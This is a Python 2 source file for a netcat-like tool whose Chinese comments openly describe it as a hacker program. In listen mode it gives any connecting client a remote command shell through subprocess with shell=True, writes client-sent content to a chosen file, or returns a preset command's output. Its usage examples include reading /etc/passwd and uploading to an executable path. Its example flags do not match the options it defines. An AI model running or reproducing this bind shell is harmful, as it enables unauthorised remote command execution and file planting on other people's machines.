#!/usr/bin/env python
# coding:utf-8

'''#注意这是一个黑客程序，不是用来交流的
如果是客户端，
    只能和服务端建立连接，并且传输输入字符串过去
如果是服务器端
    开启shell，客户端连入，则反弹
    打开文件，客户端输入字符串，写入文件
    执行命令，客户端连入，返回结果
'''
import argparse  # 获取命令行参数
import sys, socket, threading, subprocess

listen = False
shell = False
file = ''
command = ''
target = ''
port = 0

#执行命令
def run_command(cmd):
    try:
        result = subprocess.check_output(args=cmd, shell=True)
    except:
        result = 'Command Error!\n'

    return result

#开启一个shell
def run_shell(client_socket):
    while(True):
        recv_buffer = ''
        client_socket.send('<netcat #>:')
        while '\n' not in recv_buffer:
            recv_buffer = recv_buffer + client_socket.recv(1024)
        result = run_command(recv_buffer[:-1]) #把回车去掉
        client_socket.send(result)

#上传文件
def upload_file(client_socket):
    global file_name

    with open(file_name, 'w') as file:
        client_socket.send('Please input:\n')
        while True:
            recv_buffer = ''
            while (True):
                temp = client_socket.recv(1024)
                recv_buffer = recv_buffer + temp
                if len(temp) < 1024:
                    break
            file.write(recv_buffer)
            file.flush()
            client_socket.send('\x0d')  #一个提行字符，但是不换行。不然不让发空字符到客户端

        #client_socket.send('File saved to %s' % file_name)



#服务器端监听的客户端线程
#接受文件内容
#反弹shell
#执行命令返回结果
def client_process(client_info):
    global  command, file_name, shell
    client_socket = client_info['socket']
    client_ip = client_info['ip']

    #上传文件
    if file_name:
        upload_file(client_socket)

    #执行命令
    if command:
        result = run_command(command)
        client_socket.send(result)

    #反弹shell
    if shell:
        run_shell(client_socket)

    #如果都不是，则获取客户端发过来的内容
    while True:
        recv_buffer = ''
        while True:
            temp = client_socket.recv(1024)
            recv_buffer = recv_buffer + temp
            if len(temp) < 1024:
                break
        print 'Recv from %s: %s' % (client_ip, recv_buffer)
        client_socket.send('ACK!')






#开始监听模式，执行服务器端程序
def server_start():
    global target, port
    #如果没有target，则设置全部监听
    if not target:
        target = '0.0.0.0'

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((target, port))
    server_socket.listen(5)
    print 'Server start, listening on %s:%d' % (target, port)

    while(True):
        client_socket, client_addr = server_socket.accept()
        print 'Connecting from %s:%d' % (client_addr[0], client_addr[1])

        client_info = {'socket':client_socket, 'ip':client_addr[0]}
        #多线程
        client_thread = threading.Thread(target=client_process, args=(client_info,))
        client_thread.start()

#执行客户端程序，与服务器进行交互
def client_start():
    global target, port

    try:  # 连接服务器
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.connect((target, port))

        while True:
            #接收数据
            recv_buffer = ''
            while True:
                temp = server_socket.recv(1024)
                recv_buffer = recv_buffer + temp
                if len(temp) < 1024: #如果接受字符串小于1024说明数据接收完毕
                    break

            print recv_buffer,
            #发送数据
            send_buffer = raw_input()
            server_socket.send(send_buffer+'\n')


    except:  # 连接失败退出
        print 'Failed connect to Server %s:%d' % (target, port)
        sys.exit(0)


def main():
    global listen, shell, file_name, command, target, port
    epilog = '''
    Examples: 
        ./netcat.py -t 192.168.1.1 -p 6666 -l -s
        ./netcat.py -t 192.168.1.1 -p 6666 -l -u=c:\\target.exe
        ./netcat.py -t 192.168.1.1 -p 6666 -l -e=\"cat /etc/passwd\"
        echo \"ABCD\" | ./netcat.py -t 192.168.1.1 -p 6666
    '''
    parser = argparse.ArgumentParser(add_help=True, version='1.0', epilog=epilog,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)  # formatter_class让字符串呢能够换行输出，不然全在一行
    parser.add_argument('-t', '--target', action='store', help='Target to connect')
    parser.add_argument('-p', '--port', action='store', type=int, help='Target\'s port to connect')
    parser.add_argument('-l', '--listen', action='store_true', default=False, help='Listen mode')
    parser.add_argument('-s', '--shell', action='store_true', default=False, help='Server initialize a command shell to client')
    parser.add_argument('-c', '--command', action='store', help='Execute command')
    parser.add_argument('-f', '--file', action='store', help='Upload a file and write to')

    args = parser.parse_args()

    if not len(sys.argv[1:]):
        print parser.format_usage()
        sys.exit(0)

    # 如果没有数据则为None
    listen = args.listen
    port = args.port
    target = args.target
    command = args.command
    shell = args.shell
    file_name = args.file
    target = args.target


    #如果设置为了listen状态
    if listen:
        server_start()
    else:  #不是监听模式，则仅仅作为客户端，就只有三个选项，执行命令、获取shell、文本写入文件
        #连接服务器，如果没有输入目标则直接退出，打印参数
        if target and port:
            client_start()
        else:
            print parser.format_usage()
            sys.exit(0)


if __name__ == '__main__':
    main()